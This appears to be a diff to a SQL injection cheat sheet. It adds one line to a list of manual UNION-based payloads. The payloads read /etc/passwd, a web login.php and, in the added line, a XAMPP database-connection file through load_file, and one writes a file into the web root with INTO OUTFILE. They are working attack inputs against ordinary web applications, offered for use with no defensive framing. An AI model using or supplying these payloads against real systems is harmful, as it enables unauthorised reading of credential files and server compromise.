@@ -61,6 +61,7 @@ Manual sql injection commands
 # read file
 ?id=1 union select 1,2,3,4, load_file('/etc/passwd') ,6,7,8,9 -- -
 ?id=1 union select 1,2,3,4, load_file('/var/www/login.php') ,6,7,8,9 -- -
+LOAD_FILE('C:/xampp/htdocs/myapp/dbconnection.php'); -> xampp file read
 
 # create a file and call it to check if really created
 ?id=1 union select 1,2,3,4,'this is a test message' ,6,7,8,9 into outfile '/var/www/test' -- -
